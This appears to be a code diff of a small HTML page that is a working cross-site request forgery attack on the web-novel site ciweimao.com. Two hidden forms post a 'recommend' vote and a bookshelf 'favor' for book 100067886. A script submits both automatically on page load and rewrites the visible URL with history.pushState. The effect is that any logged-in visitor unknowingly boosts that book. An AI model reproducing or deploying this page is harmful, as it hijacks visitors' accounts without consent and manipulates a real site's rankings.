@@ -1,6 +1,15 @@
 <html>
   <body>
-	  <script>
+
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://www.ciweimao.com/book/give_recommend" method="POST" name="test">
+      <input type="hidden" name="book&#95;id" value="100067886" />
+      <input type="hidden" name="count" value="1" />
+    </form>
+<form action="https://www.ciweimao.com/bookshelf/favor" method="POST" name="test2">
+      <input type="hidden" name="book&#95;id" value="100067886" />
+    </form>
+<script>
 function submitit(){   
    var tform1= document.getElementById("test");   
    var tform2= document.getElementById("test2");   
@@ -13,16 +22,7 @@ function submitit(){
       
   
 }   
+submitit() 
 	  </script>
-  <script>history.pushState('', '', '/')</script>
-    <form action="https://www.ciweimao.com/book/give_recommend" method="POST" name="test">
-      <input type="hidden" name="book&#95;id" value="100067886" />
-      <input type="hidden" name="count" value="1" />
-    </form>
-<form action="https://www.ciweimao.com/bookshelf/favor" method="POST" name="test2">
-      <input type="hidden" name="book&#95;id" value="100067886" />
-    </form>
-
-	<script> submitit() </script>
   </body>
 </html>
